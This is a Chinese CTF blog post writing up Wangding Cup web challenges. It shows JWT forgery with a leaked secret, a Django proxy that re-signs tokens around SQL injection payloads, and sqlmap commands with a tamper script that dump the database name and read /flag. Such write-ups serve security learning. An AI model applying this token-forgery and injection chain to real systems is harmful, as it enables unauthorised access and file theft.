<!DOCTYPE html>
<html lang="zh-cn" >
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Lioders" />
	
	
	
	<title>网鼎杯WEB ｜ </title>
	
    
    
    <meta name="description" content="签到题 F12 看到传入队伍token即可 import requests data = { &amp;#39;token&amp;#39;: &amp;#39;icq5a2bb9afc45b5da4ac6c280245833&amp;#39; } r = requests.post(url=&amp;#34;http://9850f39c94194dadb76e9c70fc63af41c7ba9188b22d4172.cloudgame2.ichunqiu.com/p14.php&amp;#34;, data=data) print(r.headers) print(r.text) 拿到flag flag{81375846feb9f48f55767e0216c288e3} WEB-js_on 题目 打开网站，发现一个token 直接admin/admin一把嗦 然后注册，登录都尝试了注入，发现一个惊叹的提示！ 然后分析发" />
    

    
    
    <meta name="keywords" content="Hugo, Lioders" />
    

	
    
    <link rel="shortcut icon" href="http://example.org/images/favicon.ico" />

    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/normalize.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/zozo.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/highlight.css" />

    
    
</head>

<body>
    <div class="main animate__animated animate__fadeInDown">
        <div class="nav_container animated fadeInDown">
    <div class="site_nav" id="site_nav">
        <ul>
            
            <li>
                <a href="/">Home</a>
            </li>
            
            <li>
                <a href="/posts/">Archive</a>
            </li>
            
            <li>
                <a href="/tags/">Tags</a>
            </li>
            
            <li>
                <a href="/about/">About</a>
            </li>
            
        </ul>
    </div>
    <div class="menu_icon">
        <a id="menu_icon"><i class="ri-menu-line"></i></a>
    </div>
</div>
        <div class="header animated fadeInDown">
    <div class="site_title_container">
        <div class="site_title">
            <h1>
                <a href="http://example.org/">
                    <span></span>
                </a>
            </h1>
        </div>
        <div class="description">
            <p class="sub_title">lioders &#39;s blog</p>
            <div class="my_socials">
                
                
                <a href="https://github.com/LiodAir" title="github" target="_blank"><i class="ri-github-fill"></i></a>
                
                
                <a href="http://example.org/index.xml" type="application/rss+xml" title="rss" target="_blank"><i
                        class="ri-rss-fill"></i></a>
            </div>
        </div>
    </div>
</div>
        <div class="content">
            <div class="post_page">
                <div class="post animate__animated animate__fadeInDown">
                    <div class="post_title post_detail_title">
                        <h2><a href='/posts/chinese-preview/'>网鼎杯WEB</a></h2>
                        <span class="date">2020.05.19</span>
                    </div>
                    <div class="post_content markdown"><h2 id="签到题">签到题</h2>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/182284/28/17690/152888/610a820cE40603d37/2f853b94e030c8d0.png" alt="image"></p>
<p>F12 看到传入队伍token即可</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="s1">&#39;icq5a2bb9afc45b5da4ac6c280245833&#39;</span>
<span class="p">}</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://9850f39c94194dadb76e9c70fc63af41c7ba9188b22d4172.cloudgame2.ichunqiu.com/p14.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div><p>拿到flag</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">flag{81375846feb9f48f55767e0216c288e3}
</code></pre></div><h2 id="web-js_on-题目">WEB-js_on 题目</h2>
<p>打开网站，发现一个token 直接admin/admin一把嗦</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/182606/33/17646/21121/610a8260E8b4f6c4f/63852ca16b4d8d44.png" alt="image"></p>
<p>然后注册，登录都尝试了注入，发现一个惊叹的提示！</p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/190840/18/16778/7712/610a8297Ed8e8693f/14ff1bd550392ae1.png" alt="image"></p>
<p>然后分析发现不用登陆后返回的token是jwt，而且base64解密后存在payload字段对应</p>
<p>admin token： <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJuZXdzIjoia2V5OnhSdCpZTURxeUNDeFl4aTlhQExnY0dwbm1NMlg4aSY2In0.EpNdctJ5Knu4ZkRcatsyMOxas1QgomB0Z49qb7_eoVg; td_cookie=1460409666</code></p>
<blockquote>
<p>payload 部分
<code>{ &quot;user&quot;: &quot;admin&quot;, &quot;news&quot;: &quot;key:xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6&quot; }</code></p>
</blockquote>
<p>admin123 token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4xMjMiLCJuZXdzIjoiSGVsbG8gYWRtaW4xMjMifQ.qJ5C-x_oe-lNeYhjs9Iv4pzcYHDzNuqCe6_Dgx7tRj0; td_cookie=1460662012</code></p>
<blockquote>
<p>payload 部分
<code>{ &quot;user&quot;: &quot;admin123&quot;, &quot;news&quot;: &quot;Hello admin123&quot; }</code></p>
</blockquote>
<p>通过发现 正确的secret 正是admin账号的key: <code>xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6</code></p>
<p>通过修改payload字段 user ： admin'</p>
<p>拿到之后的token cookie替换访问</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/199121/5/1545/46223/610a82c1Eb5bd3536/83e57b67ff530853.png" alt="image"></p>
<p>有戏，但是手工尝试一番，拦截空格select sleep 等，使用堆叠注入发现后面注释 &ndash; + 和# 都无效，后来索性放到sqlmap 一把嗦。</p>
<p>用django写一个视图，给sqlmap起中转作用</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
<span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span>
<span class="c1"># Create your views here.</span>
<span class="kn">import</span> <span class="nn">jwt</span>
<span class="kn">import</span> <span class="nn">requests</span>


<span class="k">def</span> <span class="nf">proxy</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">username</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
      <span class="s2">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;{}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="p">),</span>
      <span class="s2">&#34;news&#34;</span><span class="p">:</span> <span class="s2">&#34;xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6&#34;</span>
    <span class="p">}</span>
    <span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6&#34;</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s1">&#39;token={}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">decode</span><span class="p">()),</span>
        <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;close&#39;</span>
    <span class="p">}</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://bd9856847bfc4b69b7786050462def01f2b22084fab54fef.cloudgame1.ichunqiu.com/index.php&#34;</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span>




<span class="k">def</span> <span class="nf">sql</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">proxy</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>



</code></pre></div><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/183766/3/17558/87248/610a83cbE2b4e5add/9df90df9a79202c9.png" alt="5.png"></p>
<p>跑起来</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/187716/11/16724/17952/610a83cbEa33d7f5f/b3b8eab117ccf090.png" alt="6.png"></p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/180574/14/17858/18022/610a8466Ef1d96f6b/ab649323a3862adc.png" alt="7.png"></p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/193216/31/16703/93391/610a8495E87f6d408/772458b57c360bdf.png" alt="8.png"></p>
<p><code>python2 sqlmap.py -u &quot;http://127.0.0.1:8003/index/?username=admin*&quot; --batch --level 3 -v3 --tamper=&quot;space2comment&quot; --current-db</code></p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/187224/10/16899/61222/610a84b6E74f7fb4b/7ca97ec0ca097b05.png" alt="9.png"></p>
<p>但是这里遇到问题了，发现读不了表 各种尝试都无效 发现数据库当前是root 直接&ndash;os-shell 也报错，因为会出现一个username too lang的提示。后来灵机一动直接读文件。读取flag</p>
<blockquote>
<p>python2 sqlmap.py -u &ldquo;http://127.0.0.1:8003/index/?username=admin*&rdquo; &ndash;batch &ndash;level 3 -v3 &ndash;tamper=&ldquo;space2comment&rdquo; &ndash;current-user -file-read=/flag</p>
</blockquote>
<p>flag{62bb3710-6b84-48fb-a8e0-44c92ab9962c}</p>
</div>
                    <div class="post_footer">
                        
                        <div class="meta">
                            <div class="info">
                                <span class="field tags">
                                    <i class="ri-stack-line"></i>
                                    
                                    <a href="http://example.org/tags/ctf/">CTF</a>
                                    
                                </span>
                            </div>
                        </div>
                        
                    </div>
                </div>
                
                
                <div class="doc_comments"></div>
                
            </div>
        </div>
    </div>
    <a id="back_to_top" href="#" class="back_to_top"><i class="ri-arrow-up-s-line"></i></a>
    <footer class="footer">
    <div class="powered_by">
        <a href="https://varkai.com">Designed by VarKai,</a>
        <a href="http://www.gohugo.io/">Proudly published with Hugo</a>
    </div>

    <div class="footer_slogan">
        <span>梦想被扼杀的第一个征候就是抱怨没有时间</span>
    </div>
</footer>
    <script src="http://example.org/js/jquery-3.5.1.min.js"></script>
<link href="http://example.org/css/fancybox.min.css" rel="stylesheet">
<script src="http://example.org/js/fancybox.min.js"></script>
<script src="http://example.org/js/zozo.js"></script>




</body>

</html>